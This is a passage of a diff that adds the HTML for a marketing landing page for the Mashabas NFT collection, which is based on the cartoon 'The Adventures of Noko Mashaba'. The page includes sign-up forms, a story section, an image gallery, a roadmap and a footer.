+                <div class="col-span-1 relative mt-4 md:mt-0" bis_skin_checked="1"><span
+                    class="text-xs text-red-600 hidden absolute bottom-[-30%] left-0" id="contactError">*Valid contact
+                    number requried</span> <label for="mce-PHONE">Contact number</label> <input type="text" name="PHONE"
+                    value="" id="mce-PHONE"
+                    class="w-full flex-auto rounded-md border-0 bg-white/5 px-3.5 py-2 !text-n-yellow shadow-sm ring-1 ring-inset ring-white/10 focus:ring-2 focus:ring-inset focus:ring-white sm:text-sm sm:leading-6"
+                    placeholder="+(000) 000 0000"></div>
+                <div class="col-span-1 mt-4 relative" bis_skin_checked="1"><label for="mce-EMAIL">Email address</label>
+                  <input type="email" value="" name="EMAIL" id="mce-EMAIL"
+                    class="w-full flex-auto rounded-md border-0 bg-white/5 px-3.5 py-2 text-n-yellow shadow-sm ring-1 ring-inset ring-white/10 focus:ring-2 focus:ring-inset focus:ring-white sm:text-sm sm:leading-6"
+                    placeholder="yourname@domain.com"> <span
+                    class="text-xs text-red-600 hidden absolute bottom-[-30%] left-0" id="emailError">*Valid email
+                    required</span></div>
+                <div hidden="true" bis_skin_checked="1"><input type="hidden" name="tags" value="445140"></div>
+                <div class="h-full flex items-end mt-4 md:mt-0" bis_skin_checked="1"><button
+                    onclick="submitForm(event);"
+                    class="flex-none h-fit rounded-md bg-white py-2.5 px-3.5 text-sm font-semibold text-gray-900 shadow-sm hover:bg-gray-100 focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-white">Send
+                    Me The Whitepaper</button></div>
+              </div>
+              <div class="flex items-center justify-start mt-6" bis_skin_checked="1"><svg
+                  xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5"
+                  stroke="currentColor" class="w-4 h-4 mr-2">
+                  <path stroke-linecap="round" stroke-linejoin="round"
+                    d="M16.5 10.5V6.75a4.5 4.5 0 10-9 0v3.75m-.75 11.25h10.5a2.25 2.25 0 002.25-2.25v-6.75a2.25 2.25 0 00-2.25-2.25H6.75a2.25 2.25 0 00-2.25 2.25v6.75a2.25 2.25 0 002.25 2.25z">
+                  </path>
+                </svg>
+                <p class="text-sm leading-6 text-gray-300">We care about your data and we don't do spam.</p>
+              </div>
+            </form>
+          </div>
+        </div>
+      </div>
+      <div class="spacer" bis_skin_checked="1"></div>
+      <section class="flex flex-col justify-center reveal active">
+        <div class="xl:max-w-7xl huge-screen mx-auto w-full px-8 lg:px-0" bis_skin_checked="1">
+          <lite-youtube videoid="gF7yCTKzVS0" params="rel=0"
+            style="background-image:url(./assets/youtube-thumb.png)"><button type="button" class="lty-playbtn"><span
+                class="lyt-visually-hidden">Play</span></button></lite-youtube>
+        </div>
+      </section>
+      <div class="spacer" bis_skin_checked="1"></div>
+      <section class="flex items-center relative">
+        <div class="max-w-7xl huge-screen mx-auto lg:grid lg:grid-cols-5 lg:px-12 2xl:px-0 flex flex-col-reverse"
+          bis_skin_checked="1">
+          <div class="col-span-2 lg:flex lg:items-center pt-16 lg:pt-0" bis_skin_checked="1">
+            <div class="leftie active" bis_skin_checked="1">
+              <picture class="">
+                <img src="./assets/our-story.png"
+                  loading="lazy" alt="caption"></picture>
+            </div>
+          </div>
+          <div class="lg:flex lg:flex-col lg:pl-16 px-8 lg:px-0 col-span-3" bis_skin_checked="1">
+            <div
+              class="relative text-lg font-medium text-white lg:flex-grow space-y-6 flex flex-col justify-center reveal active"
+              bis_skin_checked="1">
+              <h2 class="text-5xl font-canterpids font-extrabold tracking-wider z-10"><a id="anchor-learn">Our
+                  Story.</a></h2>
+              <div class="" bis_skin_checked="1">
+                <p class="relative z-10 text-gray-50 pb-6">The Adventures of Noko Mashaba was voted the Best Online
+                  Content at the South African Film and Television Awards in 2021. Noko is a popular village boy from
+                  Limpopo in South Africa who navigates the challenges of life through satire. He lives with his uncle,
+                  affectionately known as Malome Dons. In the cartoon series (The Adventures of Noko Mashaba), Noko and
+                  Dons try to get ahead in life, often finding themselves in compromising situations, as they confront
+                  societal norms, demands from friends and relatives and adapting to the ever-changing world of
+                  technology. The two’s constant need to cheat their way to the top often lands them in trouble, leaving
+                  them with one question, what does it really take to be successful?</p>
+                <p class="relative z-10 text-gray-50 pb-6">In Limpopo, life is a little dull, but Noko wants more, much
+                  more. Noko has ambitions of stardom and travelling the world, but he doesn’t know where to begin. He
+                  documents his adventures on his <a href="#"
+                    class="underline font-bold" bis_skin_checked="1">YouTube</a> channel (The Adventures of Noko
+                  Mashaba). Many years have passed since Noko became a household name; millions of his fans have
+                  inundated him with a call: “When is Noko going to be on mainstream TV?”.</p>
+                <p class="relative z-10 text-gray-50 pb-6">So, Malome Dons takes him to a Sangoma (Shaman) to ask for
+                  guidance and find out why Noko’s light is not shining as bright as it should. Through the help of the
+                  shaman, Noko finds out he has a calling to heed. Noko’s ancestors unveil a way for him to share his
+                  talent with his fans. The ancestors have gifted Noko with his Noko Fan Tickets (NFTs) that are to be
+                  shared with his fans who will support him to become a Global Icon.</p>
+                <div
+                  class="mt-6 sm:mt-10 lg:flex sm:justify-center lg:justify-start gap-4 space-y-4 lg:space-y-0 lg:pb-0 pb-6"
+                  bis_skin_checked="1">
+                  <div class="home-btn flex" style="opacity: 1; transform: translate(0px, 0px);" bis_skin_checked="1"><a
+                      href="#"
+                      class="sm:w-full py-2 w-64 font-canterpids text-xl !mb-0 bg-white text-gray-800 flex !items-center justify-center px-8 rounded-md font-medium bg-z-yellow lg:px-10"
+                      bis_skin_checked="1">More about us <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 ml-2"
+                        fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M17 8l4 4m0 0l-4 4m4-4H3"></path>
+                      </svg></a></div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+      <div class="spacer" bis_skin_checked="1"></div>
+      <section class="relative overflow-hidden" data-bgcolor="rgb(10, 10, 44)" data-textcolor="white">
+        <h1 class="lg:text-center text-5xl font-canterpids font-extrabold tracking-wider z-10 px-8 lg:px-0 mb-10">
+          Mashabas NFT Collection</h1>
+        <div class="max-w-7xl huge-screen mx-auto grid lg:grid-cols-2 lg:gap-14 2xl:px-0 lg:px-12 px-8"
+          bis_skin_checked="1">
+          <div class="flex flex-col justify-center items-center z-10" bis_skin_checked="1">
+            <div class="grid grid-cols-2 lg:grid-cols-4 w-full z-10 gap-4 leftie active" bis_skin_checked="1">
+              <div class="trend-card mx-auto p-3" bis_skin_checked="1">
+                <picture class="">
+                  <img src="./assets/pink-2.jpg"
+                    loading="lazy" alt="caption"></picture>
+              </div>
+              <div class="trend-card mx-auto p-3" bis_skin_checked="1">
+                <picture class="">
+                  <img src="./assets/purple.jpg"
+                    loading="lazy" alt="caption"></picture>
+              </div>
+              <div class="trend-card mx-auto p-3" bis_skin_checked="1">
+                <picture class="">
+                  <img src="./assets/peach.jpg"
+                    loading="lazy" alt="caption"></picture>
+              </div>
+              <div class="trend-card mx-auto p-3" bis_skin_checked="1">
+                <picture class="">
+                  <img src="./assets/pink-3.jpg"
+                    loading="lazy" alt="caption"></picture>
+              </div>
+              <div class="trend-card mx-auto p-3" bis_skin_checked="1">
+                <picture class="">
+                  <img src="./assets/yellow.jpg"
+                    loading="lazy" alt="caption"></picture>
+              </div>
+              <div class="trend-card mx-auto p-3" bis_skin_checked="1">
+                <picture class="">
+                  <img
+                    src="./assets/light-blue.jpg" loading="lazy" alt="caption"></picture>
+              </div>
+              <div class="trend-card mx-auto p-3" bis_skin_checked="1">
+                <picture class="">
+                  <img src="./assets/maroon.jpg"
+                    loading="lazy" alt="caption"></picture>
+              </div>
+              <div class="trend-card mx-auto p-3" bis_skin_checked="1">
+                <picture class="">
+                  <img src="./assets/blue.jpg"
+                    loading="lazy" alt="caption"></picture>
+              </div>
+              <div class="trend-card mx-auto p-3" bis_skin_checked="1">
+                <picture class="">
+                  <img src="./assets/brown.jpg"
+                    loading="lazy" alt="caption"></picture>
+              </div>
+              <div class="trend-card mx-auto p-3" bis_skin_checked="1">
+                <picture class="">
+                  <img src="./assets/pink.jpg"
+                    loading="lazy" alt="caption"></picture>
+              </div>
+              <div class="trend-card mx-auto p-3" bis_skin_checked="1">
+                <picture class="">
+                  <img src="./assets/green.jpg"
+                    loading="lazy" alt="caption"></picture>
+              </div>
+              <div class="trend-card mx-auto p-3" bis_skin_checked="1">
+                <picture class="">
+                  <img src="./assets/orange.jpg"
+                    loading="lazy" alt="caption"></picture>
+              </div>
+            </div>
+          </div>
+          <div class="lg:pr-4 lg:flex lg:flex-col" bis_skin_checked="1">
+            <div class="relative text-lg font-medium text-white lg:flex-grow space-y-6 reveal active"
+              bis_skin_checked="1">
+              <h2 class="text-5xl font-canterpids font-extrabold tracking-wider z-10 mt-10 lg:mt-0">THE NOKO FAN TICKET
+                (NFT)</h2>
+              <div class="" bis_skin_checked="1">
+                <p class="relative z-10 text-gray-50 pb-6">The Noko Fan Ticket (NFT), the first of the MASHABAS NFT
+                  Collection, combines Noko’s character with traditional couture from Africa and other parts of the
+                  world. This NFT project will be the launchpad for the world’s first animated series and related
+                  merchandise to be built by its fans and community through an NFT offering.</p>
+                <p class="relative z-10 text-gray-50 pb-6">It is South Africa's first and largest Animation NFT project.
+                  The collection is based on the award winning and popular cartoon series, “The Adventures of Noko
+                  Mashaba” that was created by Jonas Lekganyane.</p>
+                <p class="relative z-10 text-gray-50 pb-6">The Noko NFT Collection consists of 10,000 unique Noko NFTs,
+                  with Noko wearing beautiful garments and accessories from the African continent and around the world.
+                </p>
+                <p class="relative z-10 text-gray-50">Refer to Roadmap for all the benefits that come with holding a
+                  MASHABAS NFT.</p>
+                <div
+                  class="mt-6 sm:mt-10 lg:flex sm:justify-center lg:justify-start gap-4 space-y-4 lg:space-y-0 lg:pb-0 pb-6"
+                  bis_skin_checked="1">
+                  <div class="home-btn flex" style="opacity: 1; transform: translate(0px, 0px);" bis_skin_checked="1"><a
+                      href="#"
+                      class="sm:w-full py-2 w-72 font-canterpids text-xl !mb-0 bg-white text-gray-800 flex !items-center justify-center px-8 rounded-lg font-medium bg-z-yellow lg:px-10"
+                      bis_skin_checked="1">Explore Collection <svg xmlns="http://www.w3.org/2000/svg"
+                        class="h-8 w-8 ml-2" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M17 8l4 4m0 0l-4 4m4-4H3"></path>
+                      </svg></a></div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+      <div class="spacer" bis_skin_checked="1"></div>
+      <div class="w-full mx-auto flex flex-col justify-center items-center z-10" bis_skin_checked="1">
+        <h3 class="text-center font-canterpids text-5xl mb-6 z-10">Our Road Map</h3>
+        <p class="relative z-10 mb-10 mt-0 text-center px-10 lg:px-0 max-w-2xl">Noko and Dons are hitting the open road
+          to follow Noko’s Calling, gaining support from their fans, old and new, by selling their Noko Fan Tickets
+          (NFT) in the dream of bringing the Noko series to the big and little screens. Our journey (Roadmap) has some
+          interesting stops along the way and will present both rewards and utility to Noko’s Fans (Community).</p>
+      </div>
+      <section class="w-full mx-auto flex flex-col justify-center items-center z-10" data-bgcolor="rgb(10, 10, 44)"
+        data-textcolor="white">
+        <div class="w-full mx-auto flex flex-col justify-center items-center z-10" bis_skin_checked="1">
+          <div id="container" class="outer-wrapper relative" bis_skin_checked="1">
+            <div class="roadmap-cont w-full z-10 flex flex-col justify-start relative" bis_skin_checked="1">
+              <div class="roadmap relative !w-full" id="clouds" style="background-position: -730.413px 0px;"
+                bis_skin_checked="1"><img src="./assets/roadmap_large.png" alt="caption"
+                  class="object-fill object-bottom origin-left pt-20 w-full h-full"> <img src="./assets/car.png" alt=""
+                  class="absolute left-0 lg:bottom-10 car h-28 md:h-36 lg:h-36 bottom-2"></div>
+              <div
+                class="scroll-overlay bg-black bg-opacity-80 z-50 absolute h-full w-full top-0 left-0 hidden xl:flex font-canterpids text-3xl pointer-events-none"
+                bis_skin_checked="1" style="opacity: 0;">
+                <div class="w-screen flex justify-center items-center h-full" bis_skin_checked="1"><span
+                    class="flex items-center justify-center text-white">DRAG<svg xmlns="http://www.w3.org/2000/svg"
+                      class="h-8 w-8" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                      <path stroke-linecap="round" stroke-linejoin="round"
+                        d="M15 15l-2 5L9 9l11 4-5 2zm0 0l5 5M7.188 2.239l.777 2.897M5.136 7.965l-2.898-.777M13.95 4.05l-2.122 2.122m-5.657 5.656l-2.12 2.122">
+                      </path>
+                    </svg></span></div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+      <div class="home-btn flex pt-8" style="opacity: 1; transform: translate(0px, 0px);" bis_skin_checked="1"><a
+          href="#"
+          class="py-2 w-72 mx-auto font-canterpids text-xl !mb-0 bg-white text-gray-800 flex !items-center justify-center px-8 rounded-lg font-medium bg-z-yellow lg:px-10"
+          bis_skin_checked="1">Explore Our Roadmap <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 ml-2"
+            fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M17 8l4 4m0 0l-4 4m4-4H3"></path>
+          </svg></a></div>
+      <div class="spacer" bis_skin_checked="1"></div>
+      <section class="flex items-center relative px-8 lg:px-0">
+        <div class="max-w-7xl huge-screen mx-auto flex flex-col-reverse lg:grid lg:grid-cols-2 lg:px-12 2xl:px-0"
+          bis_skin_checked="1">
+          <div class="lg:py-16 h-full pb-10 lg:pb-0 pt-16 lg:pt-0" bis_skin_checked="1">
+            <div class="relative text-lg font-medium text-white lg:flex-grow h-full" bis_skin_checked="1">
+              <div class="flex items-center justify-center h-full leftie active" bis_skin_checked="1">
+                <picture class="">
+                  <img
+                    src="./assets/hut-small.png" loading="lazy" alt="caption" width="600" class="nft-card-2"></picture>
+              </div>
+            </div>
+          </div>
+          <div class="lg:flex lg:flex-col lg:pr-4" bis_skin_checked="1">
+            <div class="relative text-lg font-medium lg:flex-grow space-y-6 flex flex-col justify-center"
+              bis_skin_checked="1">
+              <h3 class="text-4xl font-canterpids font-extrabold tracking-wider z-10">THE DIGITAL RONDAVEL <span
+                  class="italic text-n-pink">(METAVERSE HUT)</span></h3>
+              <p class="relative z-10">A Rondavel (Hut) has traditionally been made out of sand, stone and cow dung and
+                was used as living areas and animal pens. But now it’s a place where things go down, and what goes in
+                never comes out the same.....Noko stepped into a rondavel to see a Sangoma (Shaman) and was gifted Noko
+                Fan Tickets (NFTs) by his ancestors to help him fulfil his calling.</p>
+              <p class="relative z-10">The world is talking metaverse this, and metaverse that....but we have had our
+                own version of the “Metaverse” for decades, the Rondavel…A place where crazy sh** happens.</p>
+              <p class="relative z-10">We can't wait for you to explore what our Digital Rondavel has to offer in the
+                coming months and years.</p>
+              <div class="mt-6 sm:mt-10 lg:flex sm:justify-center lg:justify-start gap-4 space-y-4 lg:space-y-0"
+                bis_skin_checked="1">
+                <div class="home-btn flex" style="opacity: 1; transform: translate(0px, 0px);" bis_skin_checked="1"><a
+                    href="#"
+                    class="sm:w-full py-2 w-64 font-canterpids text-xl !mb-0 bg-white text-gray-800 flex !items-center justify-center px-8 rounded-md font-medium bg-z-yellow lg:px-10"
+                    bis_skin_checked="1">Find out more <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 ml-2"
+                      fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                      <path stroke-linecap="round" stroke-linejoin="round" d="M17 8l4 4m0 0l-4 4m4-4H3"></path>
+                    </svg></a></div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+      <div class="spacer" bis_skin_checked="1"></div>
+      <footer class="z-10" aria-labelledby="footer-heading">
+        <div
+          class="max-w-7xl huge-screen mx-auto pt-12 px-8 sm:px-6 lg:py-16 lg:px-12 2xl:px-0 md:grid md:grid-cols-12 gap-2 pb-12 z-10"
+          bis_skin_checked="1">
+          <div class="col-span-3 space-y-6" bis_skin_checked="1">
+            <picture>
+              <img
+                src="./assets/logo-footer.png" loading="lazy" alt="caption" width="150"></picture>
+            <p class="text-base max-w-sm">A NFT collection based on the award winning animated series "The Adventures of
+              Noko Mashaba".</p>
+            <div class="flex space-x-2" bis_skin_checked="1">
+              <ul role="list" class="mt-10 flex space-x-2 lg:space-x-4">
+                <li><a class=""  href="#" bis_skin_checked="1"><span
+                      class="sr-only">TikTok</span> <svg width="24" height="24" viewBox="0 0 35 35" fill="none"
+                      xmlns="http://www.w3.org/2000/svg" class="w-10 h-10 border-2 border-gray-600 p-2 rounded-full"
+                      aria-hidden="true">
+                      <path
+                        d="M16.708 0.027c1.745-0.027 3.48-0.011 5.213-0.027 0.105 2.041 0.839 4.12 2.333 5.563 1.491 1.479 3.6 2.156 5.652 2.385v5.369c-1.923-0.063-3.855-0.463-5.6-1.291-0.76-0.344-1.468-0.787-2.161-1.24-0.009 3.896 0.016 7.787-0.025 11.667-0.104 1.864-0.719 3.719-1.803 5.255-1.744 2.557-4.771 4.224-7.88 4.276-1.907 0.109-3.812-0.411-5.437-1.369-2.693-1.588-4.588-4.495-4.864-7.615-0.032-0.667-0.043-1.333-0.016-1.984 0.24-2.537 1.495-4.964 3.443-6.615 2.208-1.923 5.301-2.839 8.197-2.297 0.027 1.975-0.052 3.948-0.052 5.923-1.323-0.428-2.869-0.308-4.025 0.495-0.844 0.547-1.485 1.385-1.819 2.333-0.276 0.676-0.197 1.427-0.181 2.145 0.317 2.188 2.421 4.027 4.667 3.828 1.489-0.016 2.916-0.88 3.692-2.145 0.251-0.443 0.532-0.896 0.547-1.417 0.131-2.385 0.079-4.76 0.095-7.145 0.011-5.375-0.016-10.735 0.025-16.093z"
+                        fill="white"></path>
+                    </svg></a></li>
+                <li><a  href="#" bis_skin_checked="1"><span
+                      class="sr-only">LinkedIn</span> <svg width="24" height="24" viewBox="0 0 30 30" fill="none"
+                      xmlns="http://www.w3.org/2000/svg" class="w-10 h-10 border-2 border-gray-600 p-2 rounded-full"
+                      aria-hidden="true">
+                      <path
+                        d="M 8.6425781 4 C 7.1835781 4 6 5.181625 6 6.640625 C 6 8.099625 7.182625 9.3085938 8.640625 9.3085938 C 10.098625 9.3085938 11.283203 8.099625 11.283203 6.640625 C 11.283203 5.182625 10.101578 4 8.6425781 4 z M 21.535156 11 C 19.316156 11 18.0465 12.160453 17.4375 13.314453 L 17.373047 13.314453 L 17.373047 11.310547 L 13 11.310547 L 13 26 L 17.556641 26 L 17.556641 18.728516 C 17.556641 16.812516 17.701266 14.960938 20.072266 14.960938 C 22.409266 14.960937 22.443359 17.145609 22.443359 18.849609 L 22.443359 26 L 26.994141 26 L 27 26 L 27 17.931641 C 27 13.983641 26.151156 11 21.535156 11 z M 6.3632812 11.310547 L 6.3632812 26 L 10.923828 26 L 10.923828 11.310547 L 6.3632812 11.310547 z"
+                        fill="white"></path>
+                    </svg></a></li>
+                <li><a class=""  href="#" bis_skin_checked="1"><span
+                      class="sr-only">Twitter</span> <svg width="24" height="24" viewBox="0 0 24 24" fill="none"
+                      xmlns="http://www.w3.org/2000/svg" class="w-10 h-10 border-2 border-gray-600 p-2 rounded-full"
+                      aria-hidden="true">
+                      <path
+                        d="M7.548 22.501c9.056 0 14.01-7.503 14.01-14.01 0-.213 0-.425-.015-.636A10.02 10.02 0 0024 5.305a9.828 9.828 0 01-2.828.776 4.94 4.94 0 002.165-2.724 9.867 9.867 0 01-3.127 1.195 4.929 4.929 0 00-8.391 4.491A13.98 13.98 0 011.67 3.9a4.928 4.928 0 001.525 6.573A4.887 4.887 0 01.96 9.855v.063a4.926 4.926 0 003.95 4.827 4.917 4.917 0 01-2.223.084 4.93 4.93 0 004.6 3.42A9.88 9.88 0 010 20.289a13.941 13.941 0 007.548 2.209"
+                        fill="white"></path>
+                    </svg></a></li>
+                <li><a class=""  href="#" bis_skin_checked="1"><span
+                      class="sr-only">Discord</span> <svg width="24" height="24" viewBox="0 0 24 24" fill="none"
+                      xmlns="http://www.w3.org/2000/svg" class="w-10 h-10 border-2 border-gray-600 p-2 rounded-full"
+                      aria-hidden="true">
+                      <path
+                        d="M18.942 5.556a16.299 16.299 0 0 0-4.126-1.297c-.178.321-.385.754-.529 1.097a15.175 15.175 0 0 0-4.573 0 11.583 11.583 0 0 0-.535-1.097 16.274 16.274 0 0 0-4.129 1.3c-2.611 3.946-3.319 7.794-2.965 11.587a16.494 16.494 0 0 0 5.061 2.593 12.65 12.65 0 0 0 1.084-1.785 10.689 10.689 0 0 1-1.707-.831c.143-.106.283-.217.418-.331 3.291 1.539 6.866 1.539 10.118 0 .137.114.277.225.418.331-.541.326-1.114.606-1.71.832a12.52 12.52 0 0 0 1.084 1.785 16.46 16.46 0 0 0 5.064-2.595c.415-4.396-.709-8.209-2.973-11.589zM8.678 14.813c-.988 0-1.798-.922-1.798-2.045s.793-2.047 1.798-2.047 1.815.922 1.798 2.047c.001 1.123-.793 2.045-1.798 2.045zm6.644 0c-.988 0-1.798-.922-1.798-2.045s.793-2.047 1.798-2.047 1.815.922 1.798 2.047c0 1.123-.793 2.045-1.798 2.045z"
+                        fill="white"></path>
+                    </svg></a></li>
+                <li><a class=""  href="#" bis_skin_checked="1"><span
+                      class="sr-only">Facebook</span> <svg version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg"
+                      xmlns:xlink="http://www.w3.org/1999/xlink" width="40" height="40" viewBox="0 0 105 100"
+                      style="enable-background:new 0 0 100 100" xml:space="preserve" fill="none"
+                      class="border-2 border-gray-600 p-2 rounded-full">
+                      <g>
+                        <g id="facebook">
+                          <g>
+                            <path d="M40.3,23.2v14.9H26.9c-1.4,0-2.5,1.1-2.5,2.5v10.9c0,1.4,1.1,2.5,2.5,2.5h13.5v43.5c0,1.4,1.1,2.5,2.5,2.5h11.6
+                c1.4,0,2.5-1.1,2.5-2.5V54h15.7c1.4,0,2.5-1.1,2.5-2.5v-11c0-1.4-1.1-2.5-2.5-2.5H56.9V25c0-5.1,1.1-10.2,10.3-10.2h6
+                c1.4,0,2.5-1.1,2.5-2.5V2.6c0-1.4-1.1-2.5-2.5-2.5H62.8C49,0.1,40.3,9,40.3,23.2z" fill="white"></path>
+                          </g>
+                        </g>
+                      </g>
+                    </svg></a></li>
+                <li><a class=""  href="#" bis_skin_checked="1"><span
+                      class="sr-only">Instagram</span> <svg version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg"
+                      xmlns:xlink="http://www.w3.org/1999/xlink" width="40" height="40" viewBox="0 0 30 30"
+                      xml:space="preserve" fill="white"
+                      class="border-2 border-gray-600 p-2 rounded-full flex items-center justify-center">
+                      <path
+                        d="M 9.9980469 3 C 6.1390469 3 3 6.1419531 3 10.001953 L 3 20.001953 C 3 23.860953 6.1419531 27 10.001953 27 L 20.001953 27 C 23.860953 27 27 23.858047 27 19.998047 L 27 9.9980469 C 27 6.1390469 23.858047 3 19.998047 3 L 9.9980469 3 z M 22 7 C 22.552 7 23 7.448 23 8 C 23 8.552 22.552 9 22 9 C 21.448 9 21 8.552 21 8 C 21 7.448 21.448 7 22 7 z M 15 9 C 18.309 9 21 11.691 21 15 C 21 18.309 18.309 21 15 21 C 11.691 21 9 18.309 9 15 C 9 11.691 11.691 9 15 9 z M 15 11 A 4 4 0 0 0 11 15 A 4 4 0 0 0 15 19 A 4 4 0 0 0 19 15 A 4 4 0 0 0 15 11 z">
+                      </path>
+                    </svg></a></li>
+                <li><a class=""  href="#" bis_skin_checked="1"><span
+                      class="sr-only">Youtube</span> <svg version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg"
+                      xmlns:xlink="http://www.w3.org/1999/xlink" width="40" height="40" viewBox="0 0 30 30"
+                      xml:space="preserve" fill="white"
+                      class="border-2 border-gray-600 p-2 rounded-full flex items-center justify-center">
+                      <path
+                        d="M 15 4 C 10.814 4 5.3808594 5.0488281 5.3808594 5.0488281 L 5.3671875 5.0644531 C 3.4606632 5.3693645 2 7.0076245 2 9 L 2 15 L 2 15.001953 L 2 21 L 2 21.001953 A 4 4 0 0 0 5.3769531 24.945312 L 5.3808594 24.951172 C 5.3808594 24.951172 10.814 26.001953 15 26.001953 C 19.186 26.001953 24.619141 24.951172 24.619141 24.951172 L 24.621094 24.949219 A 4 4 0 0 0 28 21.001953 L 28 21 L 28 15.001953 L 28 15 L 28 9 A 4 4 0 0 0 24.623047 5.0546875 L 24.619141 5.0488281 C 24.619141 5.0488281 19.186 4 15 4 z M 12 10.398438 L 20 15 L 12 19.601562 L 12 10.398438 z">
+                      </path>
+                    </svg></a></li>
+              </ul>
+            </div>
+          </div>
+          <div class="col-start-5 col-end-8 lg:pl-20" bis_skin_checked="1">
+            <h3 class="font-semibold tracking-wider uppercase mt-6 md:mt-1 font-canterpids text-xl">Navigation</h3>
+            <ul role="list" class="mt-4 space-y-4">
+              <li><a href="#" class="text-base footer-links" bis_skin_checked="1">Home</a>
+              </li>
+              <li><a href="#" class="text-base footer-links" bis_skin_checked="1">Our
+                  Story</a></li>
+              <li><a href="#" class="text-base footer-links"
+                  bis_skin_checked="1">Collection</a></li>
+              <li><a href="#" class="text-base footer-links"
+                  bis_skin_checked="1">FAQ</a></li>
+              <li><a href="#" class="text-base footer-links"
+                  bis_skin_checked="1">Metaverse</a></li>
+              <li><a href="#" class="text-base footer-links"
+                  bis_skin_checked="1">Roadmap</a></li>
+              <li><a href="#" class="text-base footer-links" bis_skin_checked="1">Mint</a>
+              </li>
+            </ul>
+          </div>
+          <div class="col-start-9 col-end-12 xl:mt-0" bis_skin_checked="1">
+            <h3 class="text-xl font-semibold tracking-wider uppercase mt-6 md:mt-1 font-canterpids">Subscribe to our
+              newsletter</h3>
+            <p class="mt-4 text-base">The latest news, articles, and resources, sent to your inbox.</p>
+            <form class="mt-4" id="footerForm" name="footerForm"><label for="mce-EMAIL" class="sr-only">Email
+                address</label> <input type="email" value="" name="EMAIL" id="mce-EMAIL" required=""
+                class="appearance-none min-w-0 w-56 bg-white border border-transparent rounded-md py-2 px-4 text-base text-gray-900 placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-offset-gray-800 focus:ring-white focus:border-white focus:placeholder-gray-400"
+                placeholder="Enter your email">
+              <div hidden="true" bis_skin_checked="1"><input type="hidden" name="tags" value="445141"></div>
+              <div class="mt-3 rounded-md sm:mt-0 sm:flex-shrink-0" bis_skin_checked="1"><button type="submit"
+                  onclick="submitFooterForm(event);"
+                  class="mt-4 w-56 text-black bg-white footer-links font-canterpids flex items-center justify-center px-8 py-2 rounded-md text-base font-medium bg-z-yellow md:py-2 md:text-lg md:px-0">Sign
+                  up <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 ml-2" fill="none" viewBox="0 0 24 24"
+                    stroke="currentColor" stroke-width="2">
+                    <path stroke-linecap="round" stroke-linejoin="round" d="M17 8l4 4m0 0l-4 4m4-4H3"></path>
+                  </svg></button> <span class="text-xs text-red-600 block pt-4 hidden" id="footerFormErr">*Valid email
+                  requried</span> <span class="text-xs text-green-300 block pt-4 hidden" id="footerFormSuccess">Sign up
+                  successful</span></div>
+            </form>
+          </div>
+        </div>
+        <div class="z-10" bis_skin_checked="1">
+          <div class="py-12 border-t border-gray-200 pt-8 max-w-7xl mx-auto px-4 divide-x-2 z-10" bis_skin_checked="1">
+            <p class="text-base font-light text-center z-10">© 2022 Noko Mashaba. All Rights Reserved | Website Design
+              by <a class="font-bold" href="#" bis_skin_checked="1">Electric Sheep
+                Agency.</a></p>
+          </div>
+        </div>
+      </footer>
+    </section>
+  </div>
+  <div style="display:flex" id="preloader" class="loaderContainer !hidden" bis_skin_checked="1">
+    <div class="loader flex items-center justify-center" bis_skin_checked="1"><img src="./assets/logo-black.png" alt=""
+        class="preloader"></div>
+  </div>
+</body>
+
+</html>
